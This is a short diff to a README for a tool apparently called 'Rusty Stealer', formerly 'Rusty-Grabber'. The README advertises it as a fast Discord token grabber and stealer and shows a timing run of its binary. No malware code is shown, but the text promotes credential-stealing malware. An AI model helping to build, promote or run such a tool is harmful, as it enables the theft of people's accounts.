@@ -1,7 +1,7 @@
-# Rusty-Grabber 🚀
-- *a blazing fast Discord Token Grabber, no popo made with python*
+# Rusty Stealer 🚀
+- *a blazing fast Discord Token Grabber & Stealer, no popo made with python*
 
-## Fastest Token Grabber **ever** :
+## Fastest Token Grabber & Stealer **ever** :
 ```bash
 Rusty-Grabber> time ./target/release/grabber
 0.00user 0.00system 0:00.72elapsed 0%CPU (0avgtext+0avgdata 5396maxresident)k
